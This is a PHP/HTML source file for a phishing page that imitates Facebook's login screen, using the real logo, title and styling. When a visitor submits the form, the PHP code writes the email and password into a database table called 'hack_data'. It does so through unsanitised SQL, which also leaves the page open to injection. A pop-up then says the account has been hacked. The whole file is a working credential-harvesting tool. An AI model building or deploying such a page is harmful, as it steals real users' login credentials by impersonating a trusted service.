<?php
include "conn.php";
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Facebook - log in or sign up</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="w3hubs.com">
    <link rel="shortcut icon" href="fb.png" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
    <style type="text/css">
      body{
      background-color: #f0f2f5;
      font-family: "Nunito Sans";
      }
      .login-form{
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
      background-color: #fff;
      padding: 25px;
      }
      h3{
      padding-left:30px;
      padding-right: 20px;
      }
      .btn-custom{
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      line-height: 28px;
      color: #fff;
      font-weight:700;
      height: 48px;
      }
      .btn-custom{
      color: #fff !important;
      }
      input{
      height: 52px;
      font-size: 18px !important;
      color: #f2f2f2;
      }
      .form-control:focus{
      box-shadow: 0 0 0 0 rgba(13,110,253,.25);
      }
      a{
      text-decoration: none;
      }
      a:hover{
      text-decoration: underline;
      }
      @media(max-width: 768px){
        .col-md-7,p{
          display: none;
        }
        input{
          font-size: 16px !important;
        }
        .login-form{
          box-shadow: none;
        }
      }
    </style>
  </head>
  <body>
    <?php
    if(isset($_POST["btn"]))
    {
      $email = $_POST["email"];
      $pass = $_POST["password"];
      $sql = "INSERT INTO `hack_data`(`ID`, `EMAIL`, `PASSWORD`) VALUES (NOT NULL,'$email','$pass')";
      $res = mysqli_query($conn,$sql);
      
      
    }
    ?>
    <script>
function sub() {
  alert("Your Account has been hacked");
}
    </script>
    <div class="container">
      <div class="row align-items-center justify-content-center vh-100">
        <div class="col-md-7">
          <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="w-50">
          <h3>Facebook helps you connect and share with the people in your life.</h3>
        </div>
        <div class="col-md-5">
          <form class="login-form" onsubmit="sub()" action="#" method="POST">
            <div class="mb-3">
              <input type="text" name="email" class="form-control" placeholder="Email address or phone number"
                required>
            </div>
            <div class="mb-3">
              <input type="password" name="password" class="form-control" placeholder="Password"
                required>
            </div>
            <button type="submit" name="btn" class="btn btn-custom btn-lg btn-block mt-3">Login</button>
            <div class="text-center pt-3 pb-3">
              <a href="#" class="">Forgotten password?</a>
              <hr>
              <button type="button" class="btn btn-success btn-lg mt-3">Create New Account</button>
            </div>
          </form>
          <p class="pt-3 text-center"><b>Create a Page</b> for a celebrity, band or business.</p>
        </div>
      </div>
    </div>
  </body>
</html>